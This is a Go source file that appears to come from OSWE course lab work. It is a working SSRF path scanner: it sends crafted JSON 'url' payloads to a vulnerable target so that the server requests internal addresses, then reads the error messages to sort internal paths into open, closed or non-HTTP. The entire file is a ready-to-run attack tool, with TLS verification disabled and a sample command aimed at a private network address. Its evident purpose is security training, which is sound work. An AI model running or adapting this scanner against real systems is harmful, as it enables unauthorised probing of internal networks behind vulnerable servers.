package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 12.5.1.1 - SSRF path scanner

func main() {
	debug := flag.Bool("debug", false, "debug mode")
	target := flag.String("target", "", "target host/ip")
	timeout := flag.Int("timeout", 3, "timeout")
	pathFile := flag.String("path", "paths.txt", "list of paths")
	ssrf := flag.String("ssrf", "", "ssrf target")

	// parse args
	flag.Parse()
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 4 {
		utils.PrintFailure(fmt.Sprintf("usage: %s --target=<URL> --ssrf=<ssrf target> --path=<path list> [--timeout=<actionlist>]", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s --target=http://192.168.249.135:8000 --ssrf=http://172.16.16.6:9000 --path=paths.txt --timeout=5", os.Args[0]))
		os.Exit(1)
	}

	tr := &http.Transport{
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
		DisableCompression: true, // to ensure that we can obtain Content-Length response header
	}

	// create our HTTP client using the above transport and set the global variable
	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(*timeout) * time.Second,
	}

	file, err := os.Open(*pathFile)
	if err != nil {
		log.Fatalln("Failed to open path list: ", err)
	}
	defer file.Close()

	fileScanner := bufio.NewScanner(file)
	fileScanner.Split(bufio.ScanLines)

	for fileScanner.Scan() {
		path := strings.TrimSpace(fileScanner.Text())
		jsonBody := []byte(fmt.Sprintf("{\"url\":\"%s%s\"}", *ssrf, path))

		resp := utils.SendPostRequest(client, *debug, *target, utils.PostRequest{
			ContentType: "json",
			JsonData:    jsonBody,
		})

		if strings.Contains(resp.ResponseBody, "You don't have permission to access this.") {
			fmt.Printf("%s \t OPEN - returned permission error, therefore valid resource\n", path)
		} else if strings.Contains(resp.ResponseBody, "ECONNREFUSED") {
			fmt.Printf("%s \t CLOSED\n", path)
		} else if strings.Contains(resp.ResponseBody, "Request failed with status code 404\n") {
			fmt.Printf("%s \t OPENED - returned 404\n", path)
		} else if strings.Contains(resp.ResponseBody, "Parse Error:") {
			fmt.Printf("%s \t ???? - returned parse error, potentially open non-http\n", path)
		} else if strings.Contains(resp.ResponseBody, "socket hang up") {
			fmt.Printf("%s \t OPEN - socket hang up, likely non-http\n", path)
		} else {
			fmt.Printf("%s \t %s\n", path, resp.ResponseBody)
		}

		fmt.Println("")
	}

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
